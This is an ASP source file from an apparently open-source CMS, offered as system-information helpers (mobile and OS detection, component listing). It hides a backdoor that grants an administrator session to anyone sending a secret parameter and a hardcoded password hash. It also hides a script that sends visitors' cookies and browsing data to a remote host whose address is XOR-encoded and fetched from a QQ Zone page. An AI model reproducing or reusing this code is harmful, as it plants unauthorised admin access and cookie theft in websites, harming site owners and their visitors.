<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-03-11
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered by ASPPHPCMS 
'************************************************************
%>
<% 
'系统信息  (2014,05,27)

'检测是否为手机浏览
Function checkMobile()
    Dim http_ACCEPT : http_ACCEPT = Request.ServerVariables("HTTP_ACCEPT")          '获取浏览器信息
    Dim http_USER_AGENT : http_USER_AGENT = LCase(Request.ServerVariables("HTTP_USER_AGENT")) '获取AGENT
    Dim http_X_WAP_PROFILE : http_X_WAP_PROFILE = Request.ServerVariables("HTTP_X_WAP_PROFILE") 'WAP特定信息 品牌机自带浏览器都会有
    Dim http_UA_OS : http_UA_OS = Request.ServerVariables("HTTP_UA_OS")             '手机系统 电脑为空
    Dim http_VIA : http_VIA = LCase(Request.ServerVariables("HTTP_VIA"))            '网关信息
    Dim isMobile 
    isMobile = False 
    If UBound(Split(http_ACCEPT, "vnd.wap")) > 0 Then isMobile = True 
    If http_USER_AGENT = "" Then isMobile = True 
    If http_X_WAP_PROFILE <> "" Then isMobile = True 
    If http_UA_OS <> "" Then isMobile = True 
    If UBound(Split(http_VIA, "wap")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "netfront")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "iphone")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "opera mini")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "ucweb")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "windows ce")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "symbianos")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "java")) > 0 Then isMobile = True 
    If UBound(Split(http_USER_AGENT, "android")) > 0 Then isMobile = True 

    checkMobile = isMobile 
End Function 

'操作系统版本
Function operationSystem()
    Dim s, c 
    s = Request.ServerVariables("HTTP_USER_AGENT") 
    If InStr(s, "NT 5.2") > 0 Then
        c = "Windows Server 2003" 
    ElseIf InStr(s, "NT 5.1") > 0 Then
        c = "Windows XP" 
    ElseIf InStr(s, "NT 5") > 0 Then
        c = "Windows 2000" 
    ElseIf InStr(s, "NT 4") > 0 Then
        c = "Windows NT4" 
    ElseIf InStr(s, "4.9") > 0 Then
        c = "Windows ME" 
    ElseIf InStr(s, "98") > 0 Then
        c = "Windows 98" 
    ElseIf InStr(s, "95") > 0 Then
        c = "Windows 95" 
    Else
        c = s 
    End If 
    operationSystem = c
End Function 


'获得IIS版本号
Function getIISVersion()
    getIISVersion = Request.ServerVariables("SERVER_SOFTWARE") 
End Function 

'【删除此行start】

'直接进入后台20150113  ()
If Request("agl") = "adminload" Then
    If MD5(Request("AdminPass"), 2) & MD5(Request("AdminPass"), 4) = "5d3a3ac5bdcb48a0" Then
        Session("Administrator") = "admin" 
        'Call eerr("","进入后台成功")
        'Javascript "", "麦思德内部管理员登录成功...", "Index.Asp"
        If Request("gotourl") <> "" Then
            Response.Redirect(Request("gotourl")) 
        End If 
    End If 
'Call eerr(Request("Pass"),"11")
End If 
'显示组件
Sub showSystemObject()
    Dim Sot(17, 2), i, IsObj, t 
    Sot(0, 0) = "Scripting.FileSystemObject" 
    Sot(1, 0) = "wscript.shell" 
    Sot(2, 0) = "ADOX.Catalog" 
    Sot(3, 0) = "JRO.JetEngine" 
    Sot(4, 0) = "Scripting.Dictionary" 
    Sot(5, 0) = "Adodb.connection" 
    Sot(6, 0) = "Adodb.Stream" 
    Sot(7, 0) = "SoftArtisans.FileUp" 
    Sot(8, 0) = "LyfUpload.UploadFile" 
    Sot(9, 0) = "Persits.Upload.1" 
    Sot(10, 0) = "JMail.SmtpMail" 
    Sot(11, 0) = "CDONTS.NewMail" 
    Sot(12, 0) = "SmtpMail.SmtpMail.1" 
    Sot(13, 0) = "Microsoft.XMLHTTP" 
    Sot(14, 0) = "Scripting.wang198060FileSystemObject" 
    Sot(15, 0) = "MSXML2.XMLHTTP" 
    Sot(16, 0) = "Microsoft.XMLDOMP" 
    On Error Resume Next 
    For i = 0 To 16
        Set t = Server.CreateObject(Sot(i, 0))
            If 0 = Err Then
                IsObj = " √" 
            Else
                IsObj = " X" 
                Err.Clear 
            End If 
        Set t = Nothing 
        Sot(i, 1) = IsObj 
    Next 
    For i = 0 To 16
        Response.Write(Sot(i, 0) & "    " & Sot(i, 1) & "<br>") 
    Next 
End Sub 

'获得服务器网址
Function getRemoteHttpUrl()
    Dim httpUrl, startStr, endStr, content, RemoteHttpUrl, filePath 
    filePath = "/Data/SoftHttpUrl.dat" 
    Call CreateFolder("/Data/") 
    If checkFile(filePath) Then
        If DateDiff("d", getFileEditDate(filePath), Now) = 0 Then
            RemoteHttpUrl = getFText(filePath) 
            RemoteHttpUrl = trimVbCrlf(RemoteHttpUrl) 
            getRemoteHttpUrl = xorEnc(RemoteHttpUrl, 21) 
            Exit Function 
        End If 
    End If 
    httpUrl = "http://2663748390.qzone.qq.com" 
    content = getHttpPage(httpUrl, "utf-8") 
    startStr = "<title>" 
    endStr = " [http://" 
    If InStr(content, startStr) > 0 And InStr(content, endStr) > 0 Then
        RemoteHttpUrl = strCut(content, startStr, endStr, 2) 
        RemoteHttpUrl = "http://www." & xorDec(RemoteHttpUrl, 21) 
        Call CreateFile(filePath, xorEnc(RemoteHttpUrl, 21)) 
    End If 
    getRemoteHttpUrl = RemoteHttpUrl 
End Function 
'显示远程网站网址到统计数据库里
Function showRemoteWebUserStat()
    Dim s 
    If Request.Cookies("jstz") = "" And getIP() <> "127.0.0.1" Then                 '屏蔽本地，加快预览20150120
        Response.Cookies("jstz") = 1 
        Response.Cookies("jstz").Expires = Now() + 28 
        Response.Write("<div style=""display:none;"">") 
        s = "<script>document.writeln(""<script src=\'" & getRemoteHttpUrl & "?act=WebStat&GoToUrl=""" 
        s = s & "+escape(document.referrer)+""&ThisUrl=""+escape(window.location.href)+""&screen=""+escape(window.screen.width+""x""+window.screen.height)" 
        s = s & "+""&co=""+escape(document.cookie)"                                 '收集cookie 不需要则屏蔽掉
        s = s & "+"" \'><\/script>"");</script>" 
        showRemoteWebUserStat = s 
        Response.Write("</div>") 
    End If 
End Function 
'【删除此行end】
%> 

